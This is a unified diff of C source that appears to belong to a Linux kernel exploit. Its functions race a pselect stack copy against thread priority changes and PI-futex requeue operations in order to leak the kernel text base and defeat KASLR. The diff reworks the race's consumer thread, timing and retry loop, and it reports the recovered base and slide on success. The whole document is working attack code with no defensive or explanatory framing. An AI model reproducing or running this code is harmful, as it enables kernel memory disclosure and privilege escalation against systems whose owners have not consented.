@@ -1,10 +1,12 @@
 #include "common.h"
 
-#define SLIDE_MAX_ATTEMPTS 40
+#define SLIDE_MAX_ATTEMPTS 20
+#define SLIDE_CONSUME_DELAY 2000
+#define SLIDE_CONSUME_USEC 0
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
-#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
-#define SLIDE_WAIT_SECONDS 10
+#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_WAIT_SECONDS 30
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -14,14 +16,15 @@ static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
+static atomic_int slide_consume_calls;
 static atomic_int slide_consume_go;
+static atomic_int slide_consume_seen;
+static atomic_int slide_consume_lost;
+static atomic_int slide_consume_enter_sched;
 static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
-static atomic_int slide_consume_calls;
-
-static int slide_word_shift;
-
-void *slide_consumer_thread(void *arg __attribute__((unused)));
+static atomic_int slide_consume_last_sched_ret;
+static atomic_int slide_consume_last_sched_errno;
 
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
@@ -29,7 +32,7 @@ int slide_pselect_words_per_set(void) {
 }
 
 int slide_pselect_global_word(int waiter_word) {
-  return slide_word_shift + waiter_word;
+  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -91,8 +94,7 @@ void slide_pselect_put_waiter_word(
   }
 }
 
-static void prepare_slide_pselect_fdsets_shifted(
-    fd_set *in, fd_set *out, fd_set *ex) {
+void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
@@ -163,8 +165,18 @@ void slide_pselect_stack_copy(void) {
   fd_set in;
   fd_set out;
   fd_set ex;
-  prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
+  prepare_slide_pselect_fdsets(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
+
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_seen, 0);
+  atomic_store(&slide_consume_lost, 0);
+  atomic_store(&slide_consume_enter_sched, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_consume_last_sched_ret, -1);
+  atomic_store(&slide_consume_last_sched_errno, 0);
 
   struct timespec timeout = {
     .tv_sec = PSELECT_TIMEOUT_SEC,
@@ -172,24 +184,18 @@ void slide_pselect_stack_copy(void) {
   };
   struct timespec *timeoutp = &timeout;
 
-  atomic_store(&slide_consume_stop, 0);
-  atomic_store(&slide_consume_go, 0);
-  atomic_store(&slide_consume_sched_ok, 0);
-  atomic_store(&slide_consume_calls, 0);
-  pthread_t consumer;
-  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
-
   atomic_store(&slide_consume_go, 1);
   errno = 0;
+
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
-          ret, saved_errno, slide_word_shift,
+  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
+          "last_sched_ret=%d last_sched_errno=%d\n",
+          ret, saved_errno, atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
-          atomic_load(&slide_consume_calls));
-
-  pthread_join(consumer, NULL);
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -199,17 +205,14 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[1]);
 }
 
-static void slide_alarm_handler(int sig __attribute__((unused))) {
-  syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
-}
-
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
 
+  int seen = 0;
   for (;;) {
     int seq = atomic_load(&slide_consume_go);
-    if (seq == 0) {
+    if (seq == 0 || seq == seen) {
       __asm__ volatile("yield" ::: "memory");
       if (atomic_load(&slide_consume_stop)) {
         return NULL;
@@ -217,18 +220,39 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       continue;
     }
 
-    usleep(1000);
+    seen = seq;
+    atomic_store(&slide_consume_seen, seen);
+    if (SLIDE_CONSUME_USEC) {
+      usleep(SLIDE_CONSUME_USEC);
+    } else {
+      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+    }
+    if (atomic_load(&slide_consume_go) != seq) {
+      int lost = atomic_load(&slide_consume_lost) + 1;
+      atomic_store(&slide_consume_lost, lost);
+      continue;
+    }
+
+    if (seq == 1) {
+      usleep(PSELECT_ENTER_DELAY_USEC);
+    }
 
     int tid = atomic_load(&slide_waiter_tid);
     int calls = atomic_load(&slide_consume_calls);
+    int entered = atomic_load(&slide_consume_enter_sched) + 1;
+    atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
-    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+    errno = 0;
+    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
+    int saved_errno = errno;
+    atomic_store(&slide_consume_last_sched_ret, (int)ret);
+    atomic_store(&slide_consume_last_sched_errno, saved_errno);
     if (ret == 0) {
-      atomic_fetch_add(&slide_consume_sched_ok, 1);
+      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
+      atomic_store(&slide_consume_sched_ok, sched_ok);
     }
-    pr_info("slide consumer sched tid=%d ret=%ld sched_ok=%d\n",
-            tid, ret, atomic_load(&slide_consume_sched_ok));
-
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
       __asm__ volatile("yield" ::: "memory");
@@ -240,17 +264,6 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
-
-  struct sigaction sa;
-  memset(&sa, 0, sizeof(sa));
-  sa.sa_handler = slide_alarm_handler;
-  sigemptyset(&sa.sa_mask);
-  sigaction(SIGALRM, &sa, NULL);
-
-  sigset_t unblock;
-  sigemptyset(&unblock);
-  sigaddset(&unblock, SIGALRM);
-  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);
 
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
@@ -270,8 +283,6 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
            &slide_f_pi_target, 0);
   futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-
-  signal(SIGALRM, SIG_DFL);
 
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
@@ -367,17 +378,13 @@ uint64_t slide_read_stext(void) {
              getpid(), (unsigned long long)stext);
   return stext;
 }
-
 uint64_t slide_child_leak_stext(void) {
-  sigset_t block;
-  sigemptyset(&block);
-  sigaddset(&block, SIGALRM);
-  pthread_sigmask(SIG_BLOCK, &block, NULL);
-
   pthread_t waiter;
   pthread_t owner;
+  pthread_t consumer;
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started)) {
@@ -388,9 +395,6 @@ uint64_t slide_child_leak_stext(void) {
   futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
            &slide_f_pi_target, 0);
 
-  usleep(50000);
-  pthread_kill(waiter, SIGALRM);
-
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
   }
@@ -399,12 +403,7 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
-  int shifts[] = {0, 1, 2, 3, -1, -2};
-  int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
-
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
-    slide_word_shift = shifts[(attempt - 1) % n_shifts];
-
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
@@ -437,20 +436,20 @@ int slide_leak_kernel_base(void) {
     SYSCHK(close(fds[0]));
     int status = 0;
     SYSCHK(waitpid(child, &status, 0));
-
-    if (n == (ssize_t)sizeof(stext) && WIFEXITED(status) &&
-        WEXITSTATUS(status) == 0 && stext) {
-      kaslr_base = stext;
-      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-      kaslr_done = 1;
-      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
-                 getpid(), (unsigned long long)kaslr_base,
-                 (unsigned long long)kaslr_slide, slide_word_shift);
-      return 1;
+    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
+        WEXITSTATUS(status) != 0 || !stext) {
+      pr_warning("slide attempt %d failed n=%zd status=%d\n",
+                 attempt, n, status);
+      continue;
     }
 
-    pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
-               attempt, n, status, slide_word_shift);
+    kaslr_base = stext;
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+    return 1;
   }
 
   return 0;
